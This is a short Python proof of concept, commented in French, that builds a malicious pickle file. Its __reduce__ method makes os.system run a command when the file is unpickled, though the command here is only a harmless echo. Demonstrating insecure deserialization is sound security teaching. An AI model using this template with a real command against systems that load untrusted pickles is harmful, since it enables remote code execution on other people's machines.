import pickle
import os

# Payload malveillant
class MaliciousPayload(object):
    def __reduce__(self):
        return (os.system, ('echo This is a malicious command',))

# Sérialisation de l'objet malveillant
with open('malicious_payload.pkl', 'wb') as file:
    pickle.dump(MaliciousPayload(), file)